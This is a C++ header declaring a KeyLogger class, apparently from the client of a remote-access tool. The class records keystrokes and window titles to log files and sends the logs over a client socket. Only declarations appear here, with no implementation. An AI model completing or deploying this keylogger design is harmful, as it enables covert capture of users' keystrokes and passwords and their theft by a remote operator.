#ifndef CLIENT_KEYLOGGER_H
#define CLIENT_KEYLOGGER_H

#include <iostream>
#include <fstream>
#include <string>
#include <fstream>
#include <atomic>
#include <thread>


#include "TimeCS.h"
#include "Install.h"
#include "Converter.h"

#include "configuration.h"
#include "Handler.h"
#include "Download.h"

class KeyLogger : public Handler {

public:
    explicit KeyLogger(ClientSocket &clientSocket, Download &download);
    void sendLastKeyloggerLog(nlohmann::json);
    void sendAll(nlohmann::json);
    void tryStart();
private:
    Download &download;
    [[nodiscard]] bool lastLogExists() const;
    [[nodiscard]] bool logsExists() const;
    void start();
    std::wstring pathOfLogs;
    std::wstring logsFileName;
    std::atomic<bool> recordingKeys = false;
    std::string tempWindow;
    bool firstRegister = true;
    static std::string getCurrentWindow();
    static bool checkShift();
    static bool checkAltGr();
    void writeCharIntoLogFile(const char *string);
    void writeCharIntoLogFile(char string);
    std::wstring generateLogName();
};


#endif
